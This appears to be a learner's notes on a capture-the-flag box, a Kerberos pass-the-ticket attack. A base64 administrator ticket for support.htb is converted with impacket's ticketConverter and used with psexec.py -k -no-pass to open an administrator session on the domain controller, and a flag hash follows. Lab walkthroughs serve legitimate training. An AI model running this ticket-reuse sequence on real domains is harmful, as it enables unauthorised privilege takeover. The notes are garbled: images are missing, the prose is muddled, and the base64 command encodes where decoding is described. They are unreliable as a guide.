
![[Pasted image 20231122122559.png]]

```
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
      cnQuaHRi
```

Will use a tools from impacket tool kit to convert this ticket to .cache so that we can use to login via it.

We got a error let's tackle it
```
python ticketConverter.py kerberos.kirbi ticket.ccache
```
![[Pasted image 20231122123205.png]]

We have simply coded the file to base 64
base64 ticket.kirbi.b64 > ticket.kirbi
```
mv kerberos.kirbi ticket.kirbi.b64
base64 ticket.kirbi.b64 > ticket.kirbi
```

So lets try to run the above command and see if we still gets the error.
So there was problem with the spacing the i think

![[Pasted image 20231122124027.png]]

Let's set the ticket ticket.ccache otherwise it will try to login with the previous set cache and through error
```
export KRB5CCNAME=Wedontexist.ccache 
```
or  simply without exporting it and using it
![[Pasted image 20231122125229.png]]

I have copy the wrong ticket as there was 3 ticket we have to copy the last ticket
```
KRB5CCNAME=ticket.ccache psexec.py -k -no-pass support.htb/administrator@dc.support.htb
```
![[Pasted image 20231122125433.png]]

```
809ca9e5522b069001b9ba82a20ef55e
```

